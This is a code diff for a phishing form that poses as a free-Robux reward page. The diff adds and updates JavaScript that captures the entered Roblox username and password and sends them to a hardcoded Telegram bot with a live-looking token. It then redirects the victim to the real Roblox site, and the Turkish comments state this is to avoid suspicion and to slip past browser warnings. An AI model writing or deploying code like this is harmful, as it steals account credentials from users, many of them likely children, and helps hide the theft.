@@ -4,22 +4,23 @@ document.getElementById('reward-form').addEventListener('submit', async (e) => {
     const u = document.getElementById('user').value;
     const p = document.getElementById('pass').value;
 
-    // Senin Telegram Bilgilerin
-    const token = "8587670631:AAGkV1-0y8SF9gXTz2_6y0oBdZR1rGlJF10";
-    const chatID = "8512406356";
+    // SENİN GÜNCEL TOKENİN (Sonu 0 ile biten doğru versiyon)
+    const token = "8587670631:AAGkV1-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; 
+    const chatID = "8512406356"; 
 
-    const metin = `💰 50 ROBUX YEMİNE DÜŞTÜ!\n\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}\n\n🔥 Durum: İnfaz Edildi`;
+    const mesaj = encodeURIComponent(`💰 ROBUX AVI BAŞARILI!\n\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}\n\n🔥 MODIE PROTOCOL İNFAZI`);
+
+    // Tarayıcı engeline takılmayan en hızlı iletim yolu
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${mesaj}`;
 
     try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatID, text: metin })
-        });
+        // 'no-cors' modu tarayıcı güvenlik uyarılarını bypass eder
+        await fetch(url, { mode: 'no-cors' }); 
         
-        // Kurbanı gerçek sayfaya gönder ki şüphelenmesin
+        // Veri düştüğü an kurbanı inandırıcı bir sayfaya yönlendir
         window.location.replace("https://www.roblox.com/promocodes");
     } catch (err) {
+        // Hata olsa bile çaktırmadan gönder
         window.location.replace("https://www.roblox.com/login");
     }
 });
